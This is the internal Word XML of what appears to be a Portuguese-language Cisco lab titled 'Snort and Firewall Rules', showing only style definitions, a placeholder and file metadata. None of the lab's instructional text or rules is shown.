    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1200"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1440"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1680"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio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odetexto">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CorpodetextoChar"/>
    <w:rsid w:val="00603503"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CorpodetextoChar">
    <w:name w:val="Corpo de texto Char"/>
    <w:link w:val="Corpodetexto"/>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odetexto"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="BodyTextBoldChar"/>
    <w:qFormat/>
    <w:rsid w:val="00C73E03"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CMDChar">
    <w:name w:val="CMD Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="CMD"/>
    <w:rsid w:val="0010436E"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextBoldChar">
    <w:name w:val="Body Text Bold Char"/>
    <w:basedOn w:val="CorpodetextoChar"/>
    <w:link w:val="BodyTextBold"/>
    <w:rsid w:val="00C73E03"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="TtuloChar"/>
    <w:qFormat/>
    <w:rsid w:val="00A33890"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:kern w:val="28"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TtuloChar">
    <w:name w:val="Título Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo"/>
    <w:rsid w:val="00A33890"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:kern w:val="28"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="LabTableStyle1">
    <w:name w:val="Lab_Table_Style1"/>
    <w:basedOn w:val="Tabe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oEspaoReservado">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="Fontepargpadro"/>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ontepargpadro"/>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B6E06"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="Ttulo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har"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0066013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h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h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h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h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har"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="240" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"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CF26E3"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:noProof/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo2Char">
    <w:name w:val="Título 2 Ch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6013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B6E06"/>
    <w:pPr>
      <w:spacing w:after="480"/>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Cabealho">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CabealhoChar"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008402F2"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CabealhoChar">
    <w:name w:val="Cabeçalho Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Cabealho"/>
    <w:rsid w:val="008402F2"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Rodap">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="Rodap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RodapChar">
    <w:name w:val="Rodapé Char"/>
    <w:link w:val="Rodap"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00E859E3"/>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odetexto"/>
    <w:next w:val="BodyTextL25"/>
    <w:qFormat/>
    <w:rsid w:val="0066013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emlista"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00457934"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="LabList">
    <w:name w:val="Lab List"/>
    <w:basedOn w:val="Sem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semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B2344"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodecomentrio">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodecomentrioChar"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B2344"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodecomentrioChar">
    <w:name w:val="Texto de comentário Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodecomentrio"/>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emlista"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00596998"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo4Char">
    <w:name w:val="Título 4 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo4"/>
    <w:rsid w:val="0066013F"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:bCs/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="6"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo5Char">
    <w:name w:val="Título 5 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo5"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo6Char">
    <w:name w:val="Título 6 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo6"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo7Char">
    <w:name w:val="Título 7 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo7"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo8Char">
    <w:name w:val="Título 8 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo8"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo9Char">
    <w:name w:val="Título 9 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo9"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo3Char">
    <w:name w:val="Título 3 Char"/>
    <w:link w:val="Ttulo3"/>
    <w:rsid w:val="00D531D0"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodenotadefim">
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodenotadefimChar"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodenotadefimChar">
    <w:name w:val="Texto de nota de fim Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodenotadefim"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodenotaderodap">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodenotaderodapChar"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodenotaderodapChar">
    <w:name w:val="Texto de nota de rodapé Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodenotaderodap"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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remissivo">
    <w:name w:val="index heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Remissivo1"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodemacro">
    <w:name w:val="macro"/>
    <w:link w:val="Textodemacro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demacroChar">
    <w:name w:val="Texto de macro Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodemacro"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:lang w:val="pt-BR" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndicedeautoridad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ndicedeilustra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tulodendicedeautoridades">
    <w:name w:val="toa heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="240"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="480"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="720"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="960"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1200"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1440"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="1680"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio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odetexto">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CorpodetextoChar"/>
    <w:rsid w:val="00603503"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CorpodetextoChar">
    <w:name w:val="Corpo de texto Char"/>
    <w:link w:val="Corpodetexto"/>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odetexto"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="BodyTextBoldChar"/>
    <w:qFormat/>
    <w:rsid w:val="00C73E03"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CMDChar">
    <w:name w:val="CMD Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="CMD"/>
    <w:rsid w:val="0010436E"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextBoldChar">
    <w:name w:val="Body Text Bold Char"/>
    <w:basedOn w:val="CorpodetextoChar"/>
    <w:link w:val="BodyTextBold"/>
    <w:rsid w:val="00C73E03"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="TtuloChar"/>
    <w:qFormat/>
    <w:rsid w:val="00A33890"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:kern w:val="28"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TtuloChar">
    <w:name w:val="Título Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo"/>
    <w:rsid w:val="00A33890"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:kern w:val="28"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="LabTableStyle1">
    <w:name w:val="Lab_Table_Style1"/>
    <w:basedOn w:val="Tabe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oEspaoReservado">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="Fontepargpadro"/>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ontepargpadro"/>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A0047F9C244BA997070E2BCCA11C5E"/>
        <w:category>
          <w:name w:val="General"/>
          <w:gallery w:val="placeholder"/>
        </w:category>
        <w:types>
          <w:type w:val="bbPlcHdr"/>
        </w:types>
        <w:behaviors>
          <w:behavior w:val="content"/>
        </w:behaviors>
        <w:guid w:val="{6D966512-9A99-4062-A687-C2E80583C925}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00CE5653" w:rsidRDefault="00E117DE">
          <w:pPr>
            <w:pStyle w:val="D0A0047F9C244BA997070E2BCCA11C5E"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:rStyle w:val="TextodoEspaoReservado"/>
              <w:lang w:val="pt-BR"/>
            </w:rPr>
            <w:t>[Função]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DE"/>
    <w:rsid w:val="00002482"/>
    <w:rsid w:val="0009378E"/>
    <w:rsid w:val="004E079F"/>
    <w:rsid w:val="00517AE0"/>
    <w:rsid w:val="005E51F1"/>
    <w:rsid w:val="009F0D6A"/>
    <w:rsid w:val="00BB02F8"/>
    <w:rsid w:val="00CE5653"/>
    <w:rsid w:val="00D113A8"/>
    <w:rsid w:val="00E1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D0A0047F9C244BA997070E2BCCA11C5E">
    <w:name w:val="D0A0047F9C244BA997070E2BCCA11C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D0A0047F9C244BA997070E2BCCA11C5E">
    <w:name w:val="D0A0047F9C244BA997070E2BCCA11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F101B-A256-4EE1-BFB7-06CB1ED2F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TotalTime>
  <Pages>9</Pages>
  <Words>2791</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 - Snort and Firewall Rules</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>Cisco Systems, Inc.</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>17830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Regras de Snort e Firewall</dc:title>
  <dc:creator>SP</dc:creator>
  <dc:description>2018</dc:description>
  <cp:lastModifiedBy>Usuário do Windows</cp:lastModifiedBy>
  <cp:revision>10</cp:revision>
  <cp:lastPrinted>2020-10-20T05:58:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-05-14T17:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-10-20T05:58:00Z</dcterms:modified>
</cp:coreProperties>
</file>